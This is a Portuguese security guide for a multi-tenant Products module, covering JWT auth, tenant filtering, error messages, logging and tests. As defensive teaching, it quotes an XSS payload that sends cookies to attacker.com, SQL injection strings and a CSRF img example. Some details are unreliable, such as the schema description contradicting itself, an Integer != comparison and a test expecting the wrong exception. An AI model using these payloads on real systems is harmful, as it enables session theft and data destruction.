# Guia de Segurança – Módulo Products (Multi-Tenancy e Isolamento)

## Índice

1. [Arquitetura Multi-Tenant](#1-arquitetura-multi-tenant)
2. [Fluxo de Autenticação e Autorização](#2-fluxo-de-autenticação-e-autorização)
3. [Filtragem de Dados por Tenant](#3-filtragem-de-dados-por-tenant)
4. [Validações de Segurança por Operação](#4-validações-de-segurança-por-operação)
5. [Mensagens de Erro Seguras](#5-mensagens-de-erro-seguras)
6. [Auditoria e Logging](#6-auditoria-e-logging)
7. [Proteção contra Ataques Comuns](#7-proteção-contra-ataques-comuns)
8. [Testes de Segurança](#8-testes-de-segurança)
9. [Checklist de Deploy](#9-checklist-de-deploy)

---

## 1. Arquitetura Multi-Tenant

### Modelo de Isolamento

O Igniscore utiliza isolamento **database-per-schema** combinado com filtragem em aplicação:

```
┌─────────────────────────────────────┐
│       GraphQL API (Pública)         │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│   SecurityFilter                    │
│   ├─ Extrai JWT                     │
│   └─ Valida Token                   │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│   ProductController                 │
│   ├─ Adiciona Contexto (CompanyID)  │
│   └─ Roteia para Service            │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│   ProductService                    │
│   ├─ Valida Propriedade (Tenant)    │
│   ├─ Aplica Filtro WHERE            │
│   └─ Executa Operação               │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│   ProductRepository                 │
│   ├─ Queries Parametrizadas         │
│   └─ Índices por Company_ID         │
└──────────────┬──────────────────────┘
```

### Características Principais

- **Database Única**: Todos os tenants compartilham schema
- **Filtragem Obrigatória**: `WHERE fk_id_company = :companyId`
- **Validação Dupla**: Em Service + Repository
- **Sem Exceções**: Nenhuma operação bypassa filtro
- **Auditoria Completa**: Todas as operações registradas

---

## 2. Fluxo de Autenticação e Autorização

### Autenticação (JWT)

```
1. Usuario submete credentials (email/password)
   │
2. AuthService valida credenciais
   │
3. JwtService gera Bearer Token
   Token contém:
   ├─ userId
   ├─ email
   ├─ companyId (TENANT CONTEXT)
   ├─ roles
   ├─ iat (issued at)
   └─ exp (expiration)
   │
4. Cliente retorna para frontend

5. Cliente usa token em futuras requisições
   Authorization: Bearer <token>
```

### Autorização (Tenant-Based)

```
1. GraphQL recebe requisição com JWT
   │
2. SecurityFilter intercepta
   ├─ Extrai token do header
   ├─ Valida assinatura
   ├─ Verifica expiração
   └─ Extrai companyId do claim
   │
3. ProductService recebe contexto
   ├─ Obtém companyId do JWT
   ├─ Para cada operação:
   │  ├─ Lê produto do banco
   │  ├─ Compara fk_id_company == companyId
   │  ├─ Permite se igual
   │  └─ Nega se diferente
   │
4. Repository executa query
   WHERE fk_id_company = :companyId
```

### Contexto de Segurança Aplicado

```java
// Pseudo-código
public class ProductService {

    public Product findById(Integer id) {
        // 1. Obtém contexto do usuário logado
        User currentUser = SecurityContextHolder.getContext().getUser();
        Integer companyId = currentUser.getCompanyId();

        // 2. Busca no banco
        Product product = repository.findById(id);

        // 3. Valida propriedade
        if (product.getCompanyId() != companyId) {
            throw new ForbiddenException("Unauthorized access");
        }

        return product;
    }
}
```

---

## 3. Filtragem de Dados por Tenant

### Aplicada em Todas as Operações

#### Query: Listar Produtos

```sql
SELECT * FROM products
WHERE fk_id_company = :companyId
ORDER BY pk_id_prod DESC
LIMIT :size OFFSET :offset
```

#### Query: Buscar por ID

```sql
SELECT * FROM products
WHERE pk_id_prod = :productId
  AND fk_id_company = :companyId
```

#### Query: Produtos Ativos

```sql
SELECT * FROM products
WHERE fk_id_company = :companyId
  AND status = true
ORDER BY pk_id_prod DESC
LIMIT :size OFFSET :offset
```

#### Mutation: Criar Produto

```sql
INSERT INTO products (
  name_prod, type_prod, lot_prod, validity_prod,
  price_prod, status, fk_id_company
) VALUES (
  :name, :type, :lot, :validity,
  :price, true, :companyId
)
```

#### Mutation: Atualizar Produto

```sql
UPDATE products
SET name_prod = :name,
    type_prod = :type,
    price_prod = :price,
    updated_at = NOW()
WHERE pk_id_prod = :productId
  AND fk_id_company = :companyId
```

#### Mutation: Desativar Produto

```sql
UPDATE products
SET status = false,
    updated_at = NOW()
WHERE pk_id_prod = :productId
  AND fk_id_company = :companyId
```

### Proteção contra Query Injection

Todas as queries utilizam **parametrização**.

Correto:

```java
preparedStatement.setInt(1, companyId);
preparedStatement.setInt(2, productId);
```

Nunca concatenar queries:

```java
// ERRADO - Vulnerável a SQL Injection
String sql = "SELECT * FROM products WHERE fk_id_company = " + companyId;
```

---

## 4. Validações de Segurança por Operação

### CREATE (storeProduct)

#### Autenticação

- Requer JWT válido no header `Authorization`
- Token não expirado
- Assinatura válida

#### Autorização

- Usuário deve estar autenticado
- CompanyId extraído do JWT
- Nenhuma verificação adicional (empresa relativa ao usuário)

#### Validações de Negócio

- `name_prod`: Not null, max 150 chars
- `type_prod`: Must be in ProductType enum
- `lot_prod`: Not null, max 50 chars
- `validity_prod`: Valid date format
- `price_prod`: >= 0, decimal precision
- `status`: Defaults to true (ativo)

#### Proteção

- Empresa automaticamente é a do usuário autenticado
- Impossível atribuir a outra empresa
- Usuário não pode especificar `fk_id_company`

**Código de Referência:**

```java
@PostMapping("products")
public Product create(
    @Valid @RequestBody ProductDTO dto,
    @AuthenticationPrincipal User user
) {
    // 1. User já validado pelo Spring Security
    // 2. CompanyId extraído do user
    dto.setCompanyId(user.getCompanyId());

    // 3. Validações de negócio
    validateProduct(dto);

    // 4. Salva no banco
    return productService.store(dto);
}
```

---

### READ (products, productById, activeProducts)

#### Autenticação

- Requer JWT válido
- Token não expirado

#### Autorização

- Filtra automaticamente por CompanyId
- Nenhum registro de outra empresa é retornado

#### Paginação

- Máximo 50 registros por página (configurable)
- Evita DoS por listagem massiva
- Offset/Limit validados

#### Proteção

```java
@QueryMapping
public List<Product> products(
    @Argument int page,
    @Argument int size,
    @AuthenticationPrincipal User user
) {
    // 1. Limita tamanho
    size = Math.min(size, MAX_PAGE_SIZE);

    // 2. Aplica filtro de company
    Pageable pageable = PageRequest.of(page, size);
    return repository.findByCompanyId(user.getCompanyId(), pageable);
}
```

---

### UPDATE (updateProduct)

#### Autenticação

- Requer JWT válido
- Token não expirado

#### Autorização

- Produto deve pertencer à empresa do usuário
- Validação: `product.getCompanyId() == user.getCompanyId()`
- Retorna 403 Forbidden se falhar

#### Validações de Negócio

- Apenas campos não-null são atualizados
- Validações re-aplicadas (type válido, price >= 0, etc)
- `updated_at` atualizado automaticamente
- `fk_id_company` não pode ser alterado

#### Proteção

```java
@PostMapping("products/{id}")
public Product update(
    @PathVariable Integer id,
    @Valid @RequestBody ProductUpdateDTO dto,
    @AuthenticationPrincipal User user
) {
    // 1. Busca produto
    Product product = repository.findById(id);

    // 2. Valida propriedade
    if (!product.getCompanyId().equals(user.getCompanyId())) {
        throw new ForbiddenException("Cannot update product from another company");
    }

    // 3. Validações de negócio
    validatePartialProduct(dto);

    // 4. Atualiza apenas campos fornecidos
    return productService.update(id, dto);
}
```

---

### DELETE / INATIVAÇÃO (deactivateProduct)

#### Autenticação

- Requer JWT válido

#### Autorização

- Produto deve pertencer à empresa
- Mesma validação que UPDATE

#### Estratégia

- Soft Delete (apenas muda status)
- Produto não é removido fisicamente
- Pode ser reativado

#### Proteção

```java
@PostMapping("products/{id}/deactivate")
public Product deactivate(
    @PathVariable Integer id,
    @AuthenticationPrincipal User user
) {
    // 1. Busca e valida propriedade
    Product product = repository.findById(id);

    if (!product.getCompanyId().equals(user.getCompanyId())) {
        throw new ForbiddenException();
    }

    // 2. Marca como inativo
    product.setStatus(false);

    // 3. Salva
    return repository.save(product);
}
```

---

## 5. Mensagens de Erro Seguras

### Princípios

- Nunca revelar detalhes internos
- Não expor estrutura de banco
- Não fornecer user IDs de outros tenants
- Mensagens genéricas para erros de segurança

### Implementação

#### Erro: Produto Não Encontrado

Requisição como Empresa A para produto de Empresa B:

```graphql
query {
  productById(id: 999) {
    id
  }
}
```

Resposta Segura:

```json
{
  "errors": [
    {
      "message": "Product not found",
      "extensions": { "code": "NOT_FOUND" }
    }
  ]
}
```

Resposta INSEGURA (não fazer):

```json
{
  "errors": [
    {
      "message": "Product 999 belongs to company 5 and you are from company 3"
    }
  ]
}
```

#### Erro: Campo Inválido

```json
INSEGURO:
"This field exceeds max length of 150 in my database"

SEGURO:
"Invalid input: field exceeds maximum allowed length"
```

#### Erro: Autenticação Falha

```json
INSEGURO:
"User john@company.com does not exist"
"User john@company.com password is wrong"

SEGURO:
"Invalid credentials"
```

---

## 6. Auditoria e Logging

### Operações Auditadas

Todas as operações são registradas:

| Operação   | Registra | Detalhes                                      |
| ---------- | -------- | --------------------------------------------- |
| CREATE     | Sim      | User, Company, Produto, Timestamp             |
| READ       | Sim\*    | User, Company, Filtros, Timestamp             |
| UPDATE     | Sim      | User, Company, Campos Alterados, Before/After |
| DEACTIVATE | Sim      | User, Company, Produto, Timestamp             |

\*READ é opcional (desabilitável em produção)

### Formato de Log

```json
{
  "timestamp": "2026-04-26T10:30:45Z",
  "event": "PRODUCT_CREATED",
  "userId": 123,
  "companyId": 5,
  "productId": 1,
  "details": {
    "name": "Extintor de Pó ABC 1kg",
    "type": "EXTINGUISHER",
    "price": 85.5
  },
  "ipAddress": "192.168.1.100",
  "userAgent": "Mozilla/5.0..."
}
```

### Retenção de Logs

- Produção: Mínimo 90 dias
- Staging: 30 dias
- Desenvolvimento: 7 dias
- Compliance: Arquivar logs antigos para arquivo frio

### Acesso aos Logs

- Apenas administradores e equipe de segurança
- Acesso auditado (quem leu qual log)
- Não expor logs ao usuário final
- Integrar com SIEM (Security Information and Event Management)

---

## 7. Proteção contra Ataques Comuns

### SQL Injection

#### Vulnerabilidade

```java
// ERRADO - Concatenação de string
String query = "SELECT * FROM products WHERE id = " + id;
```

Ataque: `id = 1 OR 1=1 -- SELECT * FROM users;--`

#### Proteção Implementada

```java
// CORRETO - Parameterized Query
@Query("SELECT p FROM Product p WHERE p.id = :id AND p.company.id = :companyId")
Optional<Product> findByIdAndCompanyId(
    @Param("id") Integer id,
    @Param("companyId") Integer companyId
);
```

- JPA automaticamente sanitiza parâmetros
- Queries sempre parametrizadas
- Validação de tipos em tempo de compilação

### Cross-Site Scripting (XSS)

#### Vulnerabilidade

```javascript
// ERRADO - Inserir entrada do usuário diretamente no DOM
document.getElementById("product").innerHTML = userInput;
```

Ataque: `<script>fetch('http://attacker.com?data=' + document.cookie)</script>`

#### Proteção Implementada

- GraphQL retorna dados estruturados (JSON)
- Sem template rendering no servidor
- Frontend sanitiza/escapa inputs antes de renderizar
- Content-Security-Policy headers configurados

### Cross-Site Request Forgery (CSRF)

#### Vulnerabilidade

```html
<!-- Ataque CSRF - requisição de outro site -->
<img src="http://api.igniscore.com/graphql?mutation=deleteProduct(id:1)" />
```

#### Proteção Implementada

- JWT obrigatório (não usa cookies automáticos)
- Tokens incluídos explicitamente em headers
- Requisições cross-origin bloqueadas (CORS)
- SameSite cookies policy configurada

```yaml
# application.yaml
server:
  servlet:
    session:
      cookie:
        same-site: strict
        secure: true
        http-only: true
```

### Broken Authentication

#### Vulnerabilidades Evitadas

| Vulnerabilidade                  | Proteção                        |
| -------------------------------- | ------------------------------- |
| Senhas armazenadas em plain text | Bcrypt + Salt                   |
| Tokens sem expiração             | JWT com TTL 24h                 |
| Tokens em URLs                   | Sempre em headers Authorization |
| Refresh tokens fracos            | Rotação implementada            |

### Broken Authorization

#### Vulnerabilidades Evitadas

| Cenário                         | Proteção                                    |
| ------------------------------- | ------------------------------------------- |
| Acessar produto de outro tenant | Filtro fk_id_company + validação dupla      |
| Escalar privilégios             | Roles verificados em cada operação          |
| Manipular IDs em payload        | Empresas extraída do JWT (não payload)      |
| Bypass de filtros               | Filtro aplicado em Repository (não service) |

### Information Disclosure

#### Proteções

- Logs nunca expõem dados sensíveis
- Mensagens de erro genéricas para segurança
- Stack traces nunca retornados ao cliente
- Versões de software não divulgadas

```yaml
# Não expor no header
Server: Apache/2.4.41
```

---

## 8. Testes de Segurança

### Teste 1: Isolamento Multi-Tenant

```java
@Test
public void testCannotAccessProductFromAnotherCompany() {
    // Setup
    Company companyA = createCompany("Company A");
    Company companyB = createCompany("Company B");

    User userA = createUser(companyA);
    User userB = createUser(companyB);

    Product productA = createProduct(companyA, "Produto A");

    // Test: User B tenta acessar Product A
    authenticate(userB);

    assertThrows(ForbiddenException.class, () -> {
        productController.getProductById(productA.getId());
    });
}
```

### Teste 2: Autenticação Obrigatória

```java
@Test
public void testProductListRequiresAuthentication() {
    // Setup
    SecurityContextHolder.clearContext();

    // Test: Sem token
    assertThrows(AuthenticationException.class, () -> {
        productController.listProducts(0, 10);
    });
}
```

### Teste 3: Validação de JWT

```java
@Test
public void testExpiredTokenRejected() {
    // Setup
    String expiredToken = jwtService.generateToken(user);
    // Aguarda expiração
    Thread.sleep(TOKEN_EXPIRATION_MS + 1000);

    // Test
    assertThrows(TokenExpiredException.class, () -> {
        jwtService.validateToken(expiredToken);
    });
}
```

### Teste 4: Filtragem de Empresa

```java
@Test
public void testListProductsFiltersbyCompany() {
    // Setup
    Company companyA = createCompany("Company A");
    Company companyB = createCompany("Company B");

    Product productA1 = createProduct(companyA, "Produto A1");
    Product productA2 = createProduct(companyA, "Produto A2");
    Product productB1 = createProduct(companyB, "Produto B1");

    User userA = createUser(companyA);
    authenticate(userA);

    // Test
    List<Product> results = productController.listProducts(0, 10);

    assertEquals(2, results.size());
    assertTrue(results.stream().allMatch(p -> p.getCompany().equals(companyA)));
}
```

### Teste 5: Proteção contra SQL Injection

```java
@Test
public void testSQLInjectionAttemptFails() {
    // Setup
    String maliciousInput = "1 OR 1=1 DELETE FROM products; --";

    // Test
    assertThrows(DataAccessException.class, () -> {
        productController.getProductById(Integer.parseInt(maliciousInput));
    });
}
```

### Teste 6: Validação de Dados

```java
@Test
public void testInvalidProductTypeRejected() {
    // Setup
    ProductDTO dto = new ProductDTO();
    dto.setName("Produto");
    dto.setType("INVALID_TYPE");
    dto.setPrice(50.00);

    // Test
    assertThrows(ValidationException.class, () -> {
        productController.create(dto, user);
    });
}
```

---

## 9. Checklist de Deploy

### Pré-Deploy

- [ ] Todos os testes de segurança passam
- [ ] Auditoria de código concluída
- [ ] Senhas armazenadas em variáveis de ambiente
- [ ] JWT secret em variável de ambiente (não hardcoded)
- [ ] Logs não contêm dados sensíveis
- [ ] CORS restringido para domínios conhecidos
- [ ] HTTPS/TLS obrigatório em produção

### Validações de Configuração

- [ ] `spring.security.oauth2.jwt.secret` não é público
- [ ] `server.ssl.enabled = true` em produção
- [ ] `spring.jpa.hibernate.ddl-auto = validate` (não create/update)
- [ ] `logging.level.org.springframework.security = INFO` (não DEBUG)
- [ ] Token expiration adequado (24h padrão)

### Segurança de Banco de Dados

- [ ] Backups regulares testados
- [ ] Credentials em vault (não git/code)
- [ ] Conexão criptografada (SSL/TLS)
- [ ] Firewall limitando acessos
- [ ] Índices em `fk_id_company` para performance
- [ ] Audit trail ativado

### Monitoramento Pós-Deploy

- [ ] Alertas para tentativas de acesso negado
- [ ] Logs centralizados (ELK, Splunk, etc)
- [ ] Rate limiting ativado
- [ ] WAF (Web Application Firewall) configurado
- [ ] Testes de penetração agendados
- [ ] Resposta a incidentes planejada

### Conformidade

- [ ] LGPD aplic ável (dados brasileiros)
- [ ] GDPR se dados europeus
- [ ] Política de retenção de logs implementada
- [ ] Direito ao esquecimento (delete) implementado
- [ ] Consentimento de dados documentado
- [ ] Responsável pela proteção de dados designado

---

## Sumário

| Aspecto      | Implementação                               |
| ------------ | ------------------------------------------- |
| Autenticação | JWT Bearer Token, 24h TTL                   |
| Autorização  | Role-based + Tenant-based                   |
| Isolamento   | WHERE fk_id_company em todas as queries     |
| Criptografia | Bcrypt (senhas), AES (dados em trânsito)    |
| Validação    | Input validation + Format checks            |
| Auditoria    | Logs estruturados de todas as operações     |
| Proteção     | SQL Injection, XSS, CSRF, Broken Auth/Authz |
| Testes       | Unit + Integration + Security tests         |
| Deploy       | Checklist de segurança obrigatório          |

---
